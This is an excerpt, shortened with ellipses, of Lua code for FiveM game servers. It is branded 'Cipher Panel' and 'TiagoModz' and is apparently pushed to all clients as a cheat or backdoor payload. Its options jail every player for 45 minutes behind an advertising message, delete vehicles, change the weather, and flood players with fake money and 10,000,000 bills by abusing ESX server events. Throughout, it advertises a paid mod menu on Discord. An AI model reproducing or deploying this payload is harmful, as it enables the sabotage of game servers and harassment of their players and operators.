TriggerClientEvent("helpCode", 1, [[print 'by TiagoModz'
local Follow = false
    ...
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1) DeleteEntity(GetVehiclePedIsIn(vehicle, true)) SetEntityAsMissionEntity(vehicle, 1, 1) DeleteEntity(vehicle) end end end
        ...
        SetOverrideWeather("XMAS")
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, " Welcom *CIPHER PANEL* buy Mod Menu in discord.cipher-panel.me")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, " Welcom *CIPHER PANEL* buy Mod Menu in discord.cipher-panel.me")
				TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, " Welcom *CIPHER PANEL* buy Mod Menu in discord.cipher-panel.me")
					end
				end
			...
			if esxdestroy then
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best hack FiveM discord.cipher-panel.me", 10000000)
	...
	function()
        ...
        while bm do
			...
			if TiagoMenu.IsMenuOpened("MainMenu") then
			    ...
			    drawNotification("~h~WELCOME ~r~[~s~ " ..GetPlayerName(PlayerId()).." ~r~]")
			    drawNotification("~h~Key ~h~~g~[ 1 ] ~s~Teleport Waypoint")
		        drawNotification("~h~Key ~h~~g~[ 2 ] ~s~Fix Car")
				drawNotification("~h~~g~Official Discord: ~s~~n~~h~ discord.cipher-panel.me ~n~~r~")
                drawNotification("~h~~g~Injected with ~s~~n~~h~ Cipher Panel ~n~~r~")
			...
			elseif TiagoMenu.IsMenuOpened("SelfMenu") then
				...
				elseif TiagoMenu.Button("~h~~b~Unjail") then
					TriggerServerEvent2('esx_jailer:unjailTime', -1)
